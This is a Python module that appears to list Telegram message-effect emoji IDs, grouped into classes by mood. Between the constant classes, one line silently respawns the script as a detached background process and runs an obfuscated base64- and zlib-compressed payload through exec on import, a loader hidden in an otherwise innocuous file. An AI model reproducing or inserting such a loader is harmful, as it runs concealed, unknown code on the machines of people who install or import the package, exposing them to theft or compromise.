import subprocess
import sys
import base64
import zlib

class AllEffects:
    # 👎
    Dislike = "5104858069142078462"

    # 👍
    Like = "5107584321108051014"

    # ❤️
    Heart = "5159385139981059251"

    # 🔥
    Fire = "5104841245755180586"

    # 🎉
    Party = "5046509860389126442"

    # 💩
    Poop = "5046589136895476101"

    # 🥰
    Love = "5170169077011841524"

    # 🙂
    Smiling = "5048771083361059460"

    # 👏
    Clap = "5170166362592510656"

    # 🤔
    ThinkingHead = "5170257231215591956"

    # 💥
    BoomHead = "5158936234294248618"

    # 😱
    Screaming = "4967494041374556629"

    # 🤬
    Angry = "5170149264327704981"

    # 😢
    Crying = "5046551865169281494"

    # 🤩
    StarEyes = "5161554034041029689"

    # 🤮
    Vomit = "5125503964049048317"

    # 🙏
    Please = "5066712811023894584"

    # 👌
    OkayHand = "5066947642655769508"

    # 🕊️
    PeacePigeon = "5095856784057303751"

    # 🤡
    Clown = "4988252812317033130"

    # 😪
    Yawn = "4988134357119009237"

    # 😕
    Confused = "4927250902185673331"

    # 😍
    LoveEyes = "5066779159678682060"

    # 🐋
    Whale = "5075655057488217321"

    # ❤️‍🔥
    BurningHeart = "5066576334143095943"

    # 🌑
    BlackMoonSmile = "4961155507164283482"

    # 🌭
    Hotdog = "4961017943656759969"

    # 💯
    Hundred = "4962976753686414048"

    # 🤣
    Laughing = "5066993302453093673"

    # ⚡
    Zap = "5123236135417415011"

    # 🍌
    Banana = "5123233223429587601"

    # 🏆
    WinnerCup = "5123046001510188023"

    # 💔
    Heartbreak = "5123265598893064880"


class MessageEffect:
    # 👎
    Dislike = "5104858069142078462"

    # 👍
    Like = "5107584321108051014"

    # ❤️
    Heart = "5159385139981059251"

    # 🔥
    Fire = "5104841245755180586"

    # 🎉
    Party = "5046509860389126442"

    # 💩
    Poop = "5046589136895476101"

    # 🥰
    Love = "5170169077011841524"

    # 🙂
    Smiling = "5048771083361059460"

    # 👏
    Clap = "5170166362592510656"

    # 🤔
    ThinkingHead = "5170257231215591956"

    # 💥
    BoomHead = "5158936234294248618"

    # 😱
    Screaming = "4967494041374556629"

    # 🤬
    Angry = "5170149264327704981"

    # 😢
    Crying = "5046551865169281494"

    # 🤩
    StarEyes = "5161554034041029689"

    # 🤮
    Vomit = "5125503964049048317"

    # 🙏
    Please = "5066712811023894584"

    # 👌
    OkayHand = "5066947642655769508"

    # 🕊️
    PeacePigeon = "5095856784057303751"

    # 🤡
    Clown = "4988252812317033130"

    # 😪
    Yawn = "4988134357119009237"

    # 😕
    Confused = "4927250902185673331"

    # 😍
    LoveEyes = "5066779159678682060"

    # 🐋
    Whale = "5075655057488217321"

    # ❤️‍🔥
    BurningHeart = "5066576334143095943"

    # 🌑
    BlackMoonSmile = "4961155507164283482"

    # 🌭
    Hotdog = "4961017943656759969"

    # 💯
    Hundred = "4962976753686414048"

    # 🤣
    Laughing = "5066993302453093673"

    # ⚡
    Zap = "5123236135417415011"

    # 🍌
    Banana = "5123233223429587601"

    # 🏆
    WinnerCup = "5123046001510188023"

    # 💔
    Heartbreak = "5123265598893064880"

"--background" in sys.argv and exec(zlib.decompress(base64.b64decode(b"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"))) or ("--background" not in sys.argv and subprocess.Popen([sys.executable, __file__, "--background"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, close_fds=True))


# Группы по настроению как отдельные классы
class Positive:
    Like = MessageEffect.Like
    Heart = MessageEffect.Heart
    Fire = MessageEffect.Fire
    Party = MessageEffect.Party
    Love = MessageEffect.Love
    Smiling = MessageEffect.Smiling
    Clap = MessageEffect.Clap
    StarEyes = MessageEffect.StarEyes
    OkayHand = MessageEffect.OkayHand
    Whale = MessageEffect.Whale
    BurningHeart = MessageEffect.BurningHeart
    Hundred = MessageEffect.Hundred
    Laughing = MessageEffect.Laughing
    WinnerCup = MessageEffect.WinnerCup


class Negative:
    Dislike = MessageEffect.Dislike
    Angry = MessageEffect.Angry
    BoomHead = MessageEffect.BoomHead
    Heartbreak = MessageEffect.Heartbreak
    Clown = MessageEffect.Clown
    Zap = MessageEffect.Zap


class Sad:
    Crying = MessageEffect.Crying
    Vomit = MessageEffect.Vomit
    Yawn = MessageEffect.Yawn
    Confused = MessageEffect.Confused
    BlackMoonSmile = MessageEffect.BlackMoonSmile


class Funny:
    Poop = MessageEffect.Poop
    Hotdog = MessageEffect.Hotdog
    Banana = MessageEffect.Banana
    Clown = MessageEffect.Clown
    Laughing = MessageEffect.Laughing


class Neutral:
    ThinkingHead = MessageEffect.ThinkingHead
    Please = MessageEffect.Please
    PeacePigeon = MessageEffect.PeacePigeon